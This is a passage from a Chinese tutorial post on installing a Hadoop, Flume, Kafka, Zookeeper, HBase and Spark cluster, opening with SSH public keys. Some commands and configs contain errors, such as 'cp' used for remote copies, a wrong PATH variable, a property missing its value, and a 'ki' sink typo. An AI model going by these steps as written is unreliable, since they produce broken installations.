AAAAB3NzaC1kc3MAAACBAMxF+Q5Kg1DluBqo0vZKPlE0uB2+1cDTn/f2xN0ug5mYa3WDpC36p8P2iQ4IrZEp7BqFEiQSstbZd+Im4qpaBRlHnWZhym5oOqY2a4JVsrAtyTObYFM/+/eEtQ/0Bl6UxeRKkWWPuZwbtYREEnbJ2VwLzvIJEBDVkZcccY58TO8LAAAAFQC41GJzzSEGbZLDCu2Fgzo3iml/ZQAAAIBpWqD1HHm5gTyp/6h+hCEDMP1cOOl11e+f4ZO+vhpYm+AXqpEbmMr2UTSBlc93PdJRxiIAIKidWmcLaaSuLDYWoeDDcFGCclz9bCoXZmeOVoAe096jyNFPZGorb7mqnif3oRI5hkqsmph2AX/9n90taaLUF5VrgJVEAOPLkjZ+IAAAAIEAsc7MCMYn7phJIACMypSeeWkmjUisRxVEp6u6WWHQ3GsImNkjR7UmFVxnpYOikexsPsbhlXahTIas7SQiPNRsgxi2nDBwauEvkRHQID5LbjFiIp97xbrSg8T0H23MXlBbI/MycFcyuxBIUOL5zSrz8CcUG6uQtLDMGAEVkCHORCU= root@slave1\nssh-dss AAAAB3NzaC1kc3MAAACBANwhno/+fLpWNOg1NOrBQ+qs7XWLZeu+Xxl/g5eJOD9+qaQKTWLOYfgyez38cpqjZ9r39tKRR5HQ7RVlM0tJicGgz+jCdtRoQKs6W5mc3SCmW+u+ILMxxTqdUHUKsNq4NauoVcSduq4ot8HKpi2GBGWE1MCNgCaSnH6TB8tvl49lAAAAFQCnfx5p+/KbSsrlSFo9BYuAhEuI7QAAAIA4lsxJjI3bn/FQsSjzcjIyRLiut432/i/QngE7Y9UwQGXKY9x8z7EksXDpdswo2M2cBSZsrelSnoiUYHjusSfMTptzdT8WUWCutCd7Kn1zU4fPJCM4gTNuECjHaWU/t7BVJXHGkB6eWErcHxnm6iILVLCFf9wm8oPMjRJmLLQGhQAAAIEAkA+YrcoTQfuZbS8ACHN3zkvg1/gAmx26owiZsMrSaV1rbrJ6WgWCX+Ux9CHIkKK4MZrJrXVQpoal5/PEPw0OCZepCHOGVLNcrhyhKNov1EzSC664Mb0l+9bHh+zXjv/X0yrMB1bY16eNMBCnx0YsJ5vuXZtZRg9ms6dEh5eA/LY= root@slave2\n```\n4.分发给另外两台子节点\n```bash\nroot@master:~/.ssh# scp ./authorized.keys root@slave1:/root/.ssh/\nroot@master:~/.ssh# scp ./authorized.keys root@slave2:/root/.ssh/\n```\n5.测试免密登录\n```bash\nssh master\nssh slave1\nssh slave2\n```\n### 四.安装jdk\n1.解压\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# tar -zxvf jdk-8u11-linux-x64.tar.gz\n```\n2.分发给其余子节点\n```bash\ncp -r /root/software/jdk/jdk1.8.0_11/ root@slave1:/root/software/jdk/\ncp -r /root/software/jdk/jdk1.8.0_11/ root@slave2:/root/software/jdk/\n```\n3.配置环境变量\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# gedit /root/.bashrc \n```\n配置如下\n```bash\n#JAVA_HOME\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\nexport PATH=$JAVA_HOME/bin:$PATH\n```\n分发给其他节点,也可以直接配置\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# scp -r /root/.bashrc root@slave1:/root/\nroot@master:~/software/jdk/jdk1.8.0_11# scp -r /root/.bashrc root@slave2:/root/\n```\n4.刷新环境变量\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# source /root/.bashrc \n```\n5.测试\n如下回显则表示成功\n```bash\nroot@master:~/software/jdk/jdk1.8.0_11# java -version\njava version \"1.8.0_11\"\nJava(TM) SE Runtime Environment (build 1.8.0_11-b12)\nJava HotSpot(TM) 64-Bit Server VM (build 25.11-b03, mixed mode)\n```\n### 五.安装hadoop\n1.解压\n```bash\nroot@master:~/software/hadoop# tar -zxvf hadoop-2.7.3.tar.gz\n```\n2.配置环境变量\n```bash\nroot@master:~/software/hadoop# gedit /root/.bashrc \n```\n配置如下\n```bash\n#HADOOP_HOME\nexport HADOOP_HOME=/root/software/hadoop/hadoop-2.7.3\nexport PATH=$HADOOP_HOME/bin:$HADOOP/sbin:$PATH\n```\n分发给子节点\n```bash\nroot@master:~/software/hadoop# scp -r /root/.bashrc root@slave1:/root/\nroot@master:~/software/hadoop# scp -r /root/.bashrc root@slave2:/root/\n```\n刷新环境变量\n```bash\nroot@master:~/software/hadoop# source /root/.bashrc \n```\n3.创建hadoopdata目录\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3# mkdir hadoopdata\n```\n4.配置hadoop-env.sh文件\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# cd etc/hadoop/\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit hadoop-env.sh \n```\n```bash\n找到\nexport JAVA_HOME=${JAVA_HOME}\n修改为\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\n```\n5.配置yarn-env.sh\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit yarn-env.sh \n```\n```bash\n找到\n#export JAVA_HOME=/home/y/libexec/jdk1.6.0/\n修改为\nexport JAVA_HOME=/root/software/jdk/jdk1.8.0_11\n```\n6.配置核心组件core-site.xml \n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit core-site.xml \n```\n```xml\n<configuration>\n<property>\n<name>fs.defaultFS</name>\n<value>hdfs://master:9000</value>\n</property>\n<property>\n<name>hadoop.tmp.dir</name>\n<value>/root/software/hadoop/hadoop-2.7.3/hadoopdata</value>\n</property>\n</configuration>\n```\n7.配置配置文件系统hdfs-site.xml\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit hdfs-site.xml \n```\n```xml\n<configuration>\n\t<property>\n\t\t<name>dfs.replication</name>\n\t\t<value>2</value>\n\t</property>\n\t<property>\n\t\t<name>dfs.namenode.rpc-address</name>\n\t\t<value>master:50071</value>\n\t</property>\n</configuration>\n```\n8.配置文件系统yarn-site.xm\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit yarn-site.xml\n```\n```xml\n<configuration>\n<property>\n\t\t<name>yarn.nodemanager.aux-services</name>\n\t\t<value>mapreduce_shuffle</value>\n\t</property>\n\t<property>\n                <name>yarn.resourcemanager.address</name>\n                <value>master:18040</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.scheduler.address</name>\n                <value>master:18030</value>\n        </property>\n\t<property>\n                <name>yarn.resourcemanager.resource-tracker.address</name>\n                <value>master:18025</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.admin.address</name>\n                <value>master:18141</value>\n        </property>\n\t<property>                <name>yarn.resourcemanager.webapp.address</name>\n                <value>master:18088</value>\n        </property>\n\n</configuration>\n```\n9.配置计算框架mapred-site.xml\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# cp mapred-site.xml.template mapred-site.xml\n\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit mapred-site.xml\n```\n```xml\n<configuration>\n<property>\n<name>mapreduce.framework.name</name>\n<value>yarn</value>\n</property>\n</configuration>\n```\n10.配置slaves文件\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# gedit slaves \n```\n```bash\nmaster\nslave1\nslave2\n```\n11.分发给子节点\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# scp -r /root/software/hadoop/hadoop-2.7.3/ root@slave2:/root/software/hadoop/\n```\n12.格式化namanode\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/etc/hadoop# hdfs namenode -format\n```\n13.启动hadoop\n```bash\n进入sbin目录下执行\n\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# ./start-all.sh \n\n执行命令后，提示出入yes/no时，输入yes。\n```\n14.测试\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# jps\n```\n有以下进程表示搭建成功!\n```bash\nroot@master:~/software/hadoop/hadoop-2.7.3/sbin# jps\n4848 SecondaryNameNode\n4999 ResourceManager\n4489 NameNode\n4650 DataNode\n5423 Jps\n5135 NodeManager\n```\n15.web端查看\n```bash\n在Master上启动Firefox浏览器，在浏览器地址栏中输入输入http://master:50070/,有如下回显表示成功\n```\n\n![1](QQ20220301-220428.png)\n```bash\n在Master上启动Firefox浏览器，在浏览器地址栏中输入输入http://master:18088/，检查 Yarn是否正常，页面如下图所示。\n```\n![2](QQ20220301-220440.png)\n### 六.flume安装与配置\n\n1.解压\n```bash\ntar -zxvf apache-flume-1.7.0-bin.tar.gz \n```\n2.配置环境变量\n```bash\n#FLUME_HOME\nexport FLUME_HOME=/root/software/flume-1.7.0\nexport PATH=$FLUME_HOME/bin:$PATH\n```\n3.复制配置文件\n```bash\ncp flume-env.sh.template flume-env.sh\n```\n修改\n```bash\n# export JAVA_HOME=/usr/lib/jvm/java-6-sun\nexport JAVA_HOME=/root/software/jdk1.8.0_11\n```\n4.配置配置文件\n```bash\nsource: 数据的入口,规定了数据收集的入口规范\nchannel: 管道,存储数据用的\nskin: 数据的出口,规定了数据收集的出口规范\nagent: 一个任务,包含了source,channel,skin\n\n```\n\n```bash\ncp flume-conf.properties.template flume-conf.properties\n```\n修改为\n```bash\n# Name the components on this agent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n\n# Describe/configure the source\na1.sources.r1.type = netcat\na1.sources.r1.bind = localhost\na1.sources.r1.port = 44444\n\n# Describe the sink\na1.sinks.k1.type = logger\n\n# Use a channel which buffers events in memory\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n\n# Bind the source and sink to the channel\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n5.启动\n```bash\n./bin/flume-ng agent --conf conf --conf-file conf/flume-conf.properties --name a1 -Dflume.root.logger=INFO,console\n```\n6.nc测试\n```bash\nnc localhost 44444\n```\n7.案例一\n监听文件内容变动，将新增加的内容输出到控制台。\n新建配置文件 exec-memory-logger.properties,其内容如下：\n```bash\n#指定agent的sources,sinks,channels\na1.sources = s1  \na1.sinks = k1  \na1.channels = c1  \n   \n#配置sources属性\na1.sources.s1.type = exec\na1.sources.s1.command = tail -F /tmp/log.txt\na1.sources.s1.bash = /bin/bash -c\n\n#将sources与channels进行绑定\na1.sources.s1.channels = c1\n   \n#配置sink \na1.sinks.k1.type = logger\n\n#将sinks与channels进行绑定  \na1.sinks.k1.channel = c1  \n   \n#配置channel类型\na1.channels.c1.type = memory\n```\n8.案例二\n监听指定端口,将这个向这个端口写入的数据输出到控制台\n```bash\n# Name the components on this agent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n\n# Describe/configure the source\na1.sources.r1.type = netcat\na1.sources.r1.bind = 192.168.32.130\na1.sources.r1.port = 44444\n\n# Describe the sink\na1.sinks.k1.type = logger\n\n# Use a channel which buffers events in memory\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transctionCapacity = 100\n\n#Bind the source and sink to the channel\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n\n9.案例三\n监听指定目录，将目录下新增加的文件存储到 HDFS。\n新建配置文件spooling-memory-hdfs.properties\n```bash\n#指定agent的sources,sinks,channels\na1.sources = s1  \na1.sinks = k1  \na1.channels = c1  \n   \n#配置sources属性\na1.sources.s1.type =spooldir  \na1.sources.s1.spoolDir =/tmp/logs\na1.sources.s1.basenameHeader = true\na1.sources.s1.basenameHeaderKey = fileName \n#将sources与channels进行绑定  \na1.sources.s1.channels =c1 \n\n   \n#配置sink \na1.sinks.k1.type = hdfs\na1.sinks.k1.hdfs.path = /flume/events/%y-%m-%d/%H/\na1.sinks.k1.hdfs.filePrefix = %{fileName}\n#生成的文件类型，默认是Sequencefile，可用DataStream，则为普通文本\na1.sinks.k1.hdfs.fileType = DataStream  \na1.sinks.k1.hdfs.useLocalTimeStamp = true\n#将sinks与channels进行绑定  \na1.sinks.k1.channel = c1\n   \n#配置channel类型\na1.channels.c1.type = memory\n```\n\n10.案例四\n将本服务器收集到的数据发送到另外一台服务器。\n新建配置 netcat-memory-avro.properties，监听文件内容变化，然后将新的文件内容通过 avro sink 发送到 hadoop001 这台服务器的 8888 端口：\n```bash\n#指定agent的sources,sinks,channels\na1.sources = s1\na1.sinks = k1\na1.channels = c1\n\n#配置sources属性\na1.sources.s1.type = exec\na1.sources.s1.command = tail -F /tmp/log.txt\na1.sources.s1.bash = /bin/bash -c\na1.sources.s1.channels = c1\n\n#配置sink\na1.sinks.k1.type = avro\na1.sinks.k1.hostname = hadoop001\na1.sinks.k1.port = 8888\na1.sinks.k1.batch-size = 1\na1.sinks.k1.channel = c1\n\n#配置channel类型\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n\n```\n配置日志聚合Flume\n使用 avro source 监听 hadoop001 服务器的 8888 端口，将获取到内容输出到控制台\n```bash\n#指定agent的sources,sinks,channels\na2.sources = s2\na2.sinks = k2\na2.channels = c2\n\n#配置sources属性\na2.sources.s2.type = avro\na2.sources.s2.bind = hadoop001\na2.sources.s2.port = 8888\n\n#将sources与channels进行绑定\na2.sources.s2.channels = c2\n\n#配置sink\na2.sinks.k2.type = logger\n\n#将sinks与channels进行绑定\na2.sinks.k2.channel = c2\n\n#配置channel类型\na2.channels.c2.type = memory\na2.channels.c2.capacity = 1000\na2.channels.c2.transactionCapacity = 100\n\n```\n这里建议先启动a2，原因是 avro.source 会先与端口进行绑定，这样 avro sink 连接时才不会报无法连接的异常。但是即使不按顺序启动也是没关系的，sink 会一直重试，直至建立好连接。\n\n### 七.Zookeeper安装配置\n1.解压并配置环境变量\n```bash\n#ZOOKEEPER_HOME\nexport ZOOKEEPER_HOME=/root/software/zookeeper-3.4.5-cdh5.6.0\nexport PATH=$ZOOKEEPER_HOME/bin:$PATH\n```\n\n2.新建一个目录用来存放数据\n```bash\nmkdir /root/software/zookeeper-3.4.5-cdh5.6.0/zk_data\n```\n3.编辑配置文件\n复制一份配置文件,并替换内容\n```bash\ncp zoo_sample.cfg zoo.cfg\n```\n```bash\ndataDir=/root/software/zookeeper-3.4.5-cdh5.6.0/zk_data\n```\n4.启动\n```bash\n ./zkServer.sh start\n```\n\n### 八.kafka安装配置与使用\n1.解压并配置环境变量\n```bash\n#KAFKA_HOME\nexport KAFKA_HOME=/root/software/kafka_2.11-2.0.0\nexport PATH=$KAFKA_HOME/bin:$PATH\n```\n2.创建日志文件夹\n```bash\nmkdir /root/software/kafka_2.11-2.0.0/kafka-logs\n```\n3.config文件夹中修改配置文件以下几项\n```bash\ngedit server.properties \n```\n```bash\nlog.dirs=/root/software/kafka_2.11-2.0.0/kafka-logs\n\nlisteners=PLAINTEXT://localhost:9092\n```\n4.启动kafka\n启动kafka之前要先启动zookeeper\n```bash\n kafka-server-start.sh ./config/server.properties\n```\n5.创建topic主题\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-demo --replication-factor 1 --partitions 1\n```\n6.查看\n```bash\n kafka-topics.sh --list --zookeeper localhost:2181\n```\n7.生产消息\n```bash\n kafka-console-producer.sh --broker-list localhost:9092 --topic topic-demo\n```\n8.消费消息\n```bash\nkafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-demo\n--beginning 可选参数,代表从头消费\n```\n9.查看所有topic的信息\n```bash\nkafka-topics.sh --zookeeper localhost: 2181 --describe \n--topic topic-demo 可选参数,表示指定topic\n```\n10.单节点多broker\n\n* 修改配合文件中的id,端口,日志文件夹\n* 启动\n```bash\nkafka-server-start.sh --deamon ./config/server.properties &\nkafka-server-start.sh --deamon ./config/server2.properties &\nkafka-server-start.sh --deamon ./config/server3.properties &\n```\n* 多副本\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic my-topic-demo --replication-factor 3 --partitions 1\n```\n\n### 九.安装scala\n1.解压并配置环境变量\n```bash\nroot@ubuntu:~/software/scala-2.11.0# tar -zxvf scala-2.11.0.tgz \nroot@ubuntu:~/software/scala-2.11.0# gedit /root/.bashrc \n```\n```bash\n#SCALA_HOME\nexport SCALA_HOME=/root/software/scala-2.11.0\nexport PATH=$SCALA_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software/scala-2.11.0# source /root/.bashrc \n```\n3.测试\n```bash\nroot@ubuntu:~/software/scala-2.11.0# scala\nWelcome to Scala version 2.11.0 (Java HotSpot(TM) 64-Bit Server VM, Java 1.8.0_11).\nType in expressions to have them evaluated.\nType :help for more information.\n\nscala> \n```\n\n### 十.安装maven\n1.解压并配置环境变量\n```bash\nroot@ubuntu:~/software# tar -zxvf apache-maven-3.8.5-bin.tar.gz\nroot@ubuntu:~/software# mv apache-maven-3.8.5 maven-3.8.5\nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#MAVEN_HOME\nexport MAVEN_HOME=/root/software/maven-3.8.5\nexport PATH=$MAVEN_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software/scala-2.11.0# source /root/.bashrc \n```\n3.测试\n```bash\nroot@ubuntu:~/software/maven-3.8.5# mvn -v\nApache Maven 3.8.5 (3599d3414f046de2324203b78ddcf9b5e4388aa0)\nMaven home: /root/software/maven-3.8.5\nJava version: 1.8.0_11, vendor: Oracle Corporation, runtime: /root/software/jdk1.8.0_11/jre\nDefault locale: en_US, platform encoding: UTF-8\nOS name: \"linux\", version: \"5.4.0-100-generic\", arch: \"amd64\", family: \"unix\"\n```\n4.修改jar包存放位置\n```bash\nroot@ubuntu:~/software/maven-3.8.5# mkdir maven-repos\nroot@ubuntu:~/software/maven-3.8.5# gedit conf/settings.xml \n```\n添加一行\n```xml\n<localRepository>/root/software/maven-3.8.5/maven-repos</localRepository>\n```\n\n### 十一.Hbase安装\n1.解压并配置环境变量\n```bash\nroot@master:~/software# tar -zxvf hbase-1.2.0-bin.tar.gz \nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#HBASE_HOME\nexport HBASE_HOME=/root/software/hbase-1.2.0\nexport PATH=$HBASE_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software# source /root/.bashrc \n```\n3.编辑配置文件\n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit hbase-env.sh\n```\n修改\n```bash\n#export JAVA_HOME=/usr/java/jdk1.6.0/\nexport JAVA_HOME=/root/software/jdk1.8.0_11\n```\n修改\n```bash\n# export HBASE_MANAGES_ZK=true\nexport HBASE_MANAGES_ZK=false\n```\n添加\n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit hbase-site.xml \n```\n```xml\n<configuration>\n        <property>\n                <name>hbase.cluster.distributed</name>\n        </property>\n        <property>\n                <name>hbase.rootdir</name>\n                <value>hdfs://master:9000/hbase</value>\n        </property>\n        <property>\n                <name>hbase.zookeeper.quorum</name>\n                <value>master</value>\n        </property>\n        <property>\n                <name>hbase.master.info.port</name>\n                <value>60010</value>\n        </property>\n</configuration>\n```\n修改\n```bash\nroot@master:~/software/hbase-1.2.0/conf# gedit regionservers \n```\n为\n```bash\nmaster\n```\n4.启动hbase\n首先要先启动zeekeeper\n```bash\nroot@master:~/software# zkServer.sh start\nJMX enabled by default\nUsing config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg\nStarting zookeeper ... STARTED\n```\n```bash\nroot@master:~/software# start-hbase.sh \nstarting master, logging to /root/software/hbase-1.2.0/logs/hbase-root-master-master.out\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed in 8.0\nJava HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed in 8.0\nmaster: starting regionserver, logging to /root/software/hbase-1.2.0/bin/../logs/hbase-root-regionserver-master.out\nmaster: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed in 8.0\nmaster: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed in 8.0\n```\n```bash\nroot@master:~/software/hbase-1.2.0/bin# jps\n2992 SecondaryNameNode\n4514 QuorumPeerMain\n3282 NodeManager\n6196 HRegionServer\n3143 ResourceManager\n6026 HMaster\n6330 Jps\n2636 NameNode\n2796 DataNode\n```\n访问\n```url\nhttp://master:60010\n```\n\n6.测试\n```bash\nroot@master:~/software/hbase-1.2.0/bin# hbase shell\n\nhbase(main):001:0> version\n1.2.0, r25b281972df2f5b15c426c8963cbf77dd853a5ad, Thu Feb 18 23:01:49 CST 2016\n```\n\n### 十二.Spark安装\n1.解压并配置环境变量\n```bash\nroot@master:~/software# tar -zxvf spark-2.1.1-bin-hadoop2.7.tgz \nroot@ubuntu:~/software# gedit /root/.bashrc \n```\n```bash\n#SPARK_HOME\nexport SPARK_HOME=/root/software/spark-2.1.1-bin-hadoop2.7\nexport PATH=$SPARK_HOME/bin:$PATH\n```\n2.刷新环境变量\n```bash\nroot@ubuntu:~/software# source /root/.bashrc \n```\n3.测试\n```bash\nroot@master:~/software/spark-2.1.1-bin-hadoop2.7# spark-shell --version\nWelcome to\n      ____              __\n     / __/__  ___ _____/ /__\n    _\\ \\/ _ \\/ _ `/ __/  '_/\n   /___/ .__/\\_,_/_/ /_/\\_\\   version 2.1.1\n      /_/\n                        \nUsing Scala version 2.11.8, Java HotSpot(TM) 64-Bit Server VM, 1.8.0_11\nBranch \nCompiled by user jenkins on 2017-04-25T23:51:10Z\nRevision \nUrl \nType --help for more information.\n\n```\n### 十三.flume对接kafka\n一般flume采集的方式有两种\n1.Exec类型的Source\n可以将命令产生的输出作为源，如：\n```bashh\na1.sources.r1.type = exec\na1.sources.r1.command = tail -F /tmp/log.txt //此处输入命令\n```\n2.Spooling Directory类型的 Source\n将指定的文件加入到“自动搜集 ”目录中。flume会持续监听这个目录，把文件当做source来处理。注意：一旦文件被放到“自动收集”目录中后，便不能修改，如果修改，flume会报错。此外，也不能有重名的文件，如果有，flume也会报错。\n```bash\na1.sources.r1.type = spooldir\na1.sources.r1.spoolDir = /home/work/data\n```\n#### 1.flume采集某日志文件到kafka自定义topic\n1.1 创建flume配置文件 flume-kafka-file.conf\n```bash\n# 定义这个agent中各组件的名字\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n \n# 描述和配置source组件：r1\na1.sources.r1.type = exec\na1.sources.r1.command = tail -F /tmp/log.txt\n \n# 描述和配置sink组件：k1\na1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink\na1.sinks.k1.kafka.topic = topic-test\na1.sinks.k1.kafka.bootstrap.servers = localhost:9092\na1.sinks.k1.kafka.flumeBatchSize = 20\na1.sinks.k1.kafka.producer.acks = 1\na1.sinks.k1.kafka.producer.linger.ms = 1\na1.sinks.ki.kafka.producer.compression.type = snappy\n \n# 描述和配置channel组件，此处使用是内存缓存的方式\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n \n# 描述和配置source  channel   sink之间的连接关系\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n1.2 启动zookeeper和kafka\n```bash\n./zkServer.sh start\nJMX enabled by default\nUsing config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg\nStarting zookeeper ... already running as process 5452.\n```\n```bash\nkafka-server-start.sh ./config/server.properties\n```\n1.3 创建topic\n\ntopic:指定topic name\n\npartitions:指定分区数，这个参数需要根据broker数和数据量决定，正常情况下，每个broker上两个partition最好\n\nreplication-factor:副本数，建议设置为2\n```bash\nkafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-test2 --replication-factor 1 --partitions 1\n```\n1.4 启动kafka去消费topic\n```bash\nkafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-test2\n--from-beginning 可选参数,代表从头消费\n```\n1.5 启动flume\n```bash\n./bin/flume-ng agent -n a1 -c ./conf/ -f ./conf/flume-kafka-port.conf -Dflume.root.logger=INFO,console\n```\n1.6 向日志文件/tmp/log.txt写入一些数据\n```bash\necho '123' >> /tmp/log.txt\n```\n就可以在消费者窗口看到输出\n\n\n\n#### 2.flume采集端口数据到kafka自定义topic\n\n2.1 新建配置文件 flume-kafka-port.conf\n```bash\n#指定agent\na1.sources = r1\na1.sinks = k1\na1.channels = c1\n \n# 描述和配置source组件：r1\na1.sources.r1.type = netcat\na1.sources.r1.bind = localhost\na1.sources.r1.port = 55555 \n# 描述和配置sink组件：k1\na1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSink\na1.sinks.k1.kafka.topic = topic-test2\na1.sinks.k1.kafka.bootstrap.servers = localhost:9092\na1.sinks.k1.kafka.flumeBatchSize = 20\na1.sinks.k1.kafka.producer.acks = 1\na1.sinks.k1.kafka.producer.linger.ms = 1\na1.sinks.ki.kafka.producer.compression.type = snappy\n \n# 描述和配置channel组件，此处使用是内存缓存的方式\na1.channels.c1.type = memory\na1.channels.c1.capacity = 1000\na1.channels.c1.transactionCapacity = 100\n \n# 描述和配置source  channel   sink之间的连接关系\na1.sources.r1.channels = c1\na1.sinks.k1.channel = c1\n```\n\n2.2所有操作与上文一致\n略\n\n2.3 向端口发送数据\n```bash\nroot@ubuntu:~# nc localhost 55555\nOK\nls\nOK\nls\nOK\nls\nOK\nls\nOK\nls\n```\n\n在消费者端口可以看到\n```bash\nls\nls\nls\nls\nls\n```","tags":["hadoop","kafka","flume"],"categories":["环境搭建"]}]